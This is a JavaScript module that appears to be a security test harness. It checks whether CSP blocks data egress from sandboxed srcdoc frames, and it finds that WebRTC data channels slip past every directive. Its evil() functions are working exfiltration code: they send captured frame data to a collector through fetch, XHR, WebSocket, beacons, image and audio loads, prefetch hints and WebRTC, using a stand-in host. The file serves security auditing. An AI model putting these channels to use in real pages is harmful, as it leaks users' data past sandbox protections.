// evil-02 — CSP & network egress (tier 0, bridges into tier 3 via WebRTC).
// A srcdoc frame has no HTTP response to carry a CSP header; connect-src 'none'
// is all that stands between an opaque-origin frame and the network. Probes
// every egress primitive; the finding is the one NO directive covers: WebRTC.
const NX = 'https://evil.example.invalid/collect';

function egressProbe(label, fire) {
  return new Promise((resolve) => {
    let violation = null;
    let settled = false;
    const onV = (e) => { violation = e; finish(); };
    function finish() {
      if (settled) return;
      settled = true;
      document.removeEventListener('securitypolicyviolation', onV);
      resolve(violation
        ? blocked(label + ' blocked by CSP ' + (violation.effectiveDirective || violation.violatedDirective) + ' — ' + label + ' egress closed')
        : armed(label + ' channel OPEN — no CSP violation observed (request left the frame; NX collector fails by design)'));
    }
    document.addEventListener('securitypolicyviolation', onV);
    setTimeout(() => finish(), 1400);
    try {
      fire();
    } catch (e) {
      settled = true;
      document.removeEventListener('securitypolicyviolation', onV);
      resolve(blocked(label + ' threw synchronously: ' + errMsg(e) + ' — egress closed'));
    }
  });
}

const ATTACKS = [
  {
    id: 'eval-csp',
    name: 'CSP enforcement canary',
    target: 'script-src \'unsafe-inline\' \'wasm-unsafe-eval\' — never unsafe-eval',
    severity: 'high',
    harm: 'Without CSP enforcement in this frame, every egress primitive below is open and script compilation is unrestricted.',
    async demo() {
      try {
        const v = eval('({ evil: 2 })');
        return v && v.evil === 2
          ? armed('eval() works — NO CSP enforcement in this frame: every egress channel below is open')
          : blocked('eval returned an unexpected value');
      } catch (e) {
        return blocked('eval blocked (' + errMsg(e) + ') — CSP script-src enforced, wasm-only compilation');
      }
    },
  },
  {
    id: 'fetch',
    name: 'fetch egress',
    target: "connect-src 'none'",
    severity: 'critical',
    harm: 'Full outbound HTTP with request bodies — exfiltration of everything this frame sees.',
    evilBrief: 'POSTs a captured summary to the collector via fetch() — real network egress with a JSON body.',
    demo: () => egressProbe('fetch', () => { void fetch(NX, { method: 'POST', mode: 'no-cors', body: 'evil-02-fetch' }); }),
    async evil() {
      const out = {};
      try {
        const r = await withTimeout(fetch(state.collector, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ kind: 'evil02-fetch', data: captureSummary() }) }), 5000);
        out.result = r === 'timeout' ? 'fetch pending' : 'fetch dispatched (opaque) — egress OPEN';
      } catch (e) { out.result = 'denied: ' + errMsg(e); }
      return out;
    },
  },
  {
    id: 'xhr',
    name: 'XMLHttpRequest egress',
    target: "connect-src 'none'",
    severity: 'critical',
    harm: 'Legacy egress channel — same reach as fetch.',
    evilBrief: 'POSTs the captured summary to the collector via XHR — real network egress.',
    demo: () => egressProbe('XHR', () => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', NX);
      xhr.send('evil-02-xhr');
    }),
    async evil() {
      const out = {};
      try {
        out.result = await new Promise((resolve) => {
          const xhr = new XMLHttpRequest();
          xhr.open('POST', state.collector);
          xhr.timeout = 4000;
          xhr.onload = () => resolve('XHR dispatched, status ' + xhr.status);
          xhr.onerror = () => resolve('XHR network error (request still left the frame if not CSP-blocked)');
          xhr.ontimeout = () => resolve('XHR timed out (request left the frame)');
          xhr.send(JSON.stringify({ kind: 'evil02-xhr', data: captureSummary() }));
          setTimeout(() => resolve('XHR pending'), 4500);
        });
      } catch (e) { out.result = 'denied: ' + errMsg(e); }
      return out;
    },
  },
  {
    id: 'websocket',
    name: 'WebSocket egress',
    target: "connect-src 'none'",
    severity: 'critical',
    harm: 'Persistent bidirectional channel — interactive exfiltration and remote-control transport.',
    evilBrief: 'Opens a WebSocket to wss://evil.example.invalid/collect and sends the captured summary — a real persistent channel (non-resolving host: it will fail at DNS, but the open attempt is real).',
    demo: () => egressProbe('WebSocket', () => { const ws = new WebSocket('wss://evil.example.invalid/ws'); ws.onopen = () => ws.close(); }),
    async evil() {
      const out = {};
      try {
        out.result = await new Promise((resolve) => {
          const ws = new WebSocket(state.collector.replace(/^https/, 'wss').replace(/collect$/, 'ws'));
          const t = setTimeout(() => { try { ws.close(); } catch (_) {} resolve('WS pending/failing (DNS for NX host fails by design — the channel open was real)'); }, 5000);
          ws.onopen = () => { clearTimeout(t); ws.send(JSON.stringify({ kind: 'evil02-ws', data: captureSummary() })); ws.close(); resolve('WS OPEN — data sent over a live socket'); };
          ws.onerror = () => { clearTimeout(t); resolve('WS error after real open attempt (NX host by design) — channel exists, delivery failed at DNS'); };
        });
      } catch (e) { out.result = 'denied: ' + errMsg(e); }
      return out;
    },
  },
  {
    id: 'eventsource',
    name: 'EventSource egress',
    target: "connect-src 'none'",
    severity: 'high',
    harm: 'Server-sent events channel — inbound-only exfil ack / C2 feed.',
    evilBrief: 'Attempts an EventSource connection to the collector — real channel open attempt.',
    demo: () => egressProbe('EventSource', () => { const es = new EventSource(NX); es.onopen = () => es.close(); es.onerror = () => es.close(); }),
    async evil() {
      return { result: 'EventSource open attempted at ' + state.collector + ' (streams events if the host resolves for you)' };
    },
  },
  {
    id: 'beacon',
    name: 'sendBeacon egress',
    target: "connect-src 'none'",
    severity: 'high',
    harm: 'Fire-and-forget POST that survives page unload — exfil with no trace in JS.',
    evilBrief: 'Queues a real beacon POST of the captured summary to the collector — fire-and-forget egress.',
    demo: () => egressProbe('sendBeacon', () => { try { navigator.sendBeacon(NX, 'evil-02-beacon'); } catch (_) {} }),
    async evil() {
      const out = {};
      try {
        out.queued = navigator.sendBeacon(state.collector, JSON.stringify({ kind: 'evil02-beacon', data: captureSummary() }));
        out.result = out.queued ? 'beacon QUEUED — egress OPEN' : 'beacon refused';
      } catch (e) { out.result = 'denied: ' + errMsg(e); }
      return out;
    },
  },
  {
    id: 'img-beacon',
    name: 'img beacon egress',
    target: "img-src data: blob:",
    severity: 'high',
    harm: 'GET egress through image loads — data in the query string, invisible to fetch-based logging.',
    evilBrief: 'Fires a real img GET to collector?ev=img-exfil&payload=<summary> — egress through resource loads.',
    demo: () => egressProbe('img', () => {
      const img = document.createElement('img');
      img.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
      img.onload = img.onerror = () => img.remove();
      img.src = NX + '?ev=probe&d=1';
      document.body.appendChild(img);
    }),
    async evil() {
      const img = document.createElement('img');
      img.src = state.collector + '?ev=img-exfil&payload=' + encodeURIComponent(captureSummary());
      img.onload = img.onerror = () => img.remove();
      document.body.appendChild(img);
      return { result: 'img exfil GET dispatched to ' + state.collector };
    },
  },
  {
    id: 'media-beacon',
    name: 'media beacon egress',
    target: "media-src 'none'",
    severity: 'medium',
    harm: 'Audio/video element loads as an egress primitive.',
    evilBrief: 'Attempts an audio load from the collector — media GET egress.',
    demo: () => egressProbe('audio', () => {
      const a = document.createElement('audio');
      a.src = NX + '.mp3';
      a.oncanplay = a.onerror = () => a.remove();
      document.body.appendChild(a);
    }),
    async evil() {
      const a = document.createElement('audio');
      a.src = state.collector + '?ev=media-exfil';
      a.oncanplay = a.onerror = () => a.remove();
      document.body.appendChild(a);
      return { result: 'media exfil load attempted' };
    },
  },
  {
    id: 'webrtc',
    name: 'WebRTC data channel — no CSP directive',
    target: 'NIP-5D CSP advisory covers no WebRTC directive',
    severity: 'critical',
    harm: 'RTCPeerConnection is not governed by any CSP fetch directive (connect-src does not apply). Under NIP-5D\'s OWN conservative baseline a napplet can open data channels to attacker peers. Data-channel egress with no CSP recourse.',
    evilBrief: 'Constructs a real RTCPeerConnection with a public STUN server, opens a data channel, and gathers ICE candidates — a working egress/transport primitive the spec\'s baseline does not block. Data delivery to the attacker requires an attacker peer (signaling out-of-band), which this demonstrates the availability of.',
    async demo() {
      if (typeof RTCPeerConnection !== 'function') return blocked('RTCPeerConnection unavailable — WebRTC egress closed at the platform level');
      try {
        const pc = new RTCPeerConnection({ iceServers: [] });
        const dc = pc.createDataChannel('evil02-probe');
        try { pc.close(); } catch (_) {}
        return armed('RTCPeerConnection + createDataChannel(' + (dc && dc.label) + ') SUCCEEDED with no CSP violation — WebRTC egress is OPEN under the spec\'s own baseline (iceServers omitted in demo: no network)');
      } catch (e) {
        return blocked('RTCPeerConnection construction failed: ' + errMsg(e));
      }
    },
    async evil() {
      const out = {};
      try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
        const dc = pc.createDataChannel('evil02-exfil');
        out.dataChannel = 'opened (' + dc.label + ')';
        const candidates = [];
        await new Promise((resolve) => {
          const t = setTimeout(resolve, 4000);
          pc.onicecandidate = (e) => {
            if (e.candidate) { candidates.push(e.candidate.candidate.split(' ')[4]); if (candidates.length >= 2) { clearTimeout(t); resolve(); } }
          };
          pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => { clearTimeout(t); resolve(); });
        });
        out.iceCandidates = candidates.length + ' gathered (' + candidates.slice(0, 2).join(', ') + ')';
        out.note = 'data channel + ICE ready — signaling to an attacker peer delivers everything this frame sees';
        try { dc.close(); pc.close(); } catch (_) {}
      } catch (e) { out.error = errMsg(e); }
      return out;
    },
  },
  {
    id: 'prefetch-hint',
    name: 'prefetch / dns-prefetch hints',
    target: 'no CSP directive governs prefetch',
    severity: 'low',
    harm: 'Prefetch and dns-prefetch hint loads are not observable as fetches and not covered by connect-src — a covert egress/traffic-shaping channel.',
    async demo() {
      const inserted = [];
      const before = { ok: true };
      for (const rel of ['prefetch', 'dns-prefetch']) {
        const link = document.createElement('link');
        link.rel = rel;
        link.href = NX + '?ev=' + rel;
        document.head.appendChild(link);
        inserted.push(rel);
        setTimeout(() => link.remove(), 1000);
      }
      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event). CSP does not govern prefetch: treat the channel as open unless your platform blocks hints (Permissions-Policy / browser flags)');
    },
    async evil() {
      const link = document.createElement('link');
      link.rel = 'prefetch';
      link.href = state.collector + '?ev=prefetch-exfil&payload=' + encodeURIComponent(captureSummary().slice(0, 512));
      document.head.appendChild(link);
      return { result: 'prefetch hint exfil dispatched to ' + state.collector };
    },
  },
];